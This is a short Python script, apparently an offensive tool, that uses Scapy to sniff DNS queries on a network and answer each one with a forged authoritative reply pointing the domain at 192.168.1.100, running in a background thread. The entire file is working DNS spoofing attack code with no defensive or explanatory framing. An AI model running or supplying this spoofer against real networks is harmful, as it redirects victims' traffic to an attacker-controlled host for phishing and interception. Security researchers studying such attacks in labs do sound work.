from scapy.all import *
import threading

spoofing = True

def dns_spoof(packet, fake_ip="192.168.1.100"):
    if packet.haslayer(DNSQR):  # DNS Query
        qname = packet[DNSQR].qname.decode()
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=10, rdata=fake_ip))
        send(spoofed_pkt, verbose=0)
        return f"[+] Spoofed {qname} → {fake_ip}"
    return None

def start_dns_spoofer(fake_ip="192.168.1.100"):
    def spoof():
        sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, fake_ip), store=0)
    
    thread = threading.Thread(target=spoof)
    thread.daemon = True
    thread.start()
    return f"[+] DNS Spoofing started. Redirecting domains to {fake_ip}"
